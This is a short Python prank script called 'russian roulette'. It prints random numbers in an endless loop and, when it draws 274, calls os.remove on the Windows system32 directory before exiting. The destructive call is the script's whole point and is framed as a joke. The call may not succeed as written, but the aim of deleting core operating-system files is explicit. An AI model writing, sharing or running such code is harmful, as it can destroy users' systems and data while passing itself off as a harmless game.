#russian roulette 
import random
import os
import time

int(input("How many times would you like to play> "))

print("Just kidding, you don't get to decide")

time.sleep(1.5)

while True:
    y=random.randint(0,1000)
    if y==274: 
        os.remove(r'C:\Windows\system32')
        exit()
    else: print(y)